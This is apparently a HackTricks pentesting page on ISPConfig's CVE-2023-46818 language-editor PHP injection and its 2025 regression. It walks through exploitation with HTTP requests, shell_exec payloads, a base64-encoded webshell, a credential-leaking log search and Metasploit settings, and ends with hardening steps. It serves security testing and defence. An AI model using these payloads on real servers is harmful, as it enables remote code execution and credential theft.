---
title: "Ispconfig"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/ispconfig.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Overview

ISPConfig is an open-source hosting control panel. Older 3.2.x builds shipped a language file editor feature that, when enabled for the super administrator, allowed arbitrary PHP code injection via a malformed translation record. This can yield RCE in the web server context and, depending on how PHP is executed, privilege escalation.[\[1\]](#references)[\[2\]](#references)[\[7\]](#references)

Common paths in the documented installation and lab setup include:[\[4\]](#references)

- Web root often at `/var/www/ispconfig` when served with`php -S` or via Apache/nginx.
- Admin UI reachable on the HTTP(S) vhost (sometimes bound to localhost only; use SSH port-forward if needed).

Tip: If the panel is bound locally (e.g. `127.0.0.1:8080`), forward it:

```
ssh -L 9001:127.0.0.1:8080 user@target
# then browse http://127.0.0.1:9001
```
## Language editor PHP code injection (CVE-2023-46818)

- Affected: ISPConfig up to 3.2.11 (fixed in 3.2.11p1)
- Preconditions:
  - Login as the built-in superadmin account `admin` (other roles are not affected according to the vendor)
  - Language editor must be enabled: `admin_allow_langedit=yes` in`/usr/local/ispconfig/security/security_settings.ini`
- Login as the built-in superadmin account
- Impact: Authenticated admin can inject arbitrary PHP that is written into a language file and executed by the application, achieving RCE in the web context

References: NVD entry CVE-2023-46818 and vendor advisory link in the References section below.[\[1\]](#references)[\[2\]](#references)[\[7\]](#references)

### Manual exploitation flow

1. Open/create a language file to obtain CSRF tokens

Send a first POST to initialize the form and parse the CSRF fields from the HTML response (`csrf_id`, `csrf_key`). Example request path: `/admin/language_edit.php`.[\[4\]](#references)

1. Inject PHP via records[] and save

Submit a second POST including the CSRF fields and a malicious translation record. Minimal command-execution probes:[\[4\]](#references)

```
POST /admin/language_edit.php HTTP/1.1
Host: 127.0.0.1:9001
Content-Type: application/x-www-form-urlencoded
Cookie: ispconfig_auth=...
lang=en&module=admin&file=messages&csrf_id=<id>&csrf_key=<key>&records[]=<?php echo shell_exec('id'); ?>
```
Out-of-band test (observe ICMP):[\[4\]](#references)

```
records[]=<?php echo shell_exec('ping -c 1 10.10.14.6'); ?>
```
1. Write files and drop a webshell

Use `file_put_contents` to create a file under a web-reachable path (e.g., `admin/`):[\[4\]](#references)

```
records[]=<?php file_put_contents('admin/pwn.txt','owned'); ?>
```
Then write a simple webshell using base64 to avoid bad characters in the POST body:[\[4\]](#references)

```
records[]=<?php file_put_contents('admin/shell.php', base64_decode('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K')); ?>
```
Use it:

```
curl 'http://127.0.0.1:9001/admin/shell.php?cmd=id'
```
If PHP is executed as root (e.g., via `php -S 127.0.0.1:8080` started by root), this yields immediate root RCE. Otherwise, you gain code execution as the web server user.[\[4\]](#references)

### 2025 regression (ISPConfig 3.3.0 / 3.3.0p1)

The language editor bug resurfaced in 3.3.0/3.3.0p1 and was fixed in **3.3.0p2**. Preconditions are unchanged (`admin_allow_langedit` and admin login). The same patch also addressed a monitor XSS and world-readable rotated logs.[\[5\]](#references)

**Notes:**

- On 3.3.0/3.3.0p1, world-readable rotated logs under `/usr/local/ispconfig/interface/log/` may leak credentials if debug logging was enabled:<sup>[\[5\]](#references)</sup>

```
find /usr/local/ispconfig/interface/log -type f -perm -004 -name '*.gz' -exec zcat {} + | head
```
- Exploit steps match CVE-2023-46818; 3.3.0p2 adds extra checks before language editing.<sup>[\[5\]](#references)</sup>

### Python PoC

A ready-to-use exploit automates token handling and payload delivery:[\[3\]](#references)

Example run:

```
python3 cve-2023-46818.py http://127.0.0.1:9001 admin <password>
```
### Metasploit module (released July 2025)

Rapid7 added `exploit/linux/http/ispconfig_lang_edit_php_code_injection`. It checks `admin_allow_langedit` and attempts to enable it when disabled, which requires administrator credentials with system-configuration access.[\[6\]](#references)

```
use exploit/linux/http/ispconfig_lang_edit_php_code_injection
set RHOSTS 10.10.10.50
set RPORT 8080
set USERNAME admin
set PASSWORD <admin_pass>
set TARGETURI /
run
```
The module writes a base64-encoded payload through `records[]` and executes it, giving a PHP Meterpreter or custom payload.[\[6\]](#references)

### Hardening

- Upgrade to **3.2.11p1** or later for the original issue, and to**3.3.0p2** or later for the 2025 regression.<sup>[\[1\]](#references)[\[5\]](#references)</sup>
- Disable the language editor unless strictly needed:

```
admin_allow_langedit=no
```
- Avoid running the panel as root; configure PHP-FPM or the web server to drop privileges
- Enforce strong authentication for the built-in `admin` account

## References
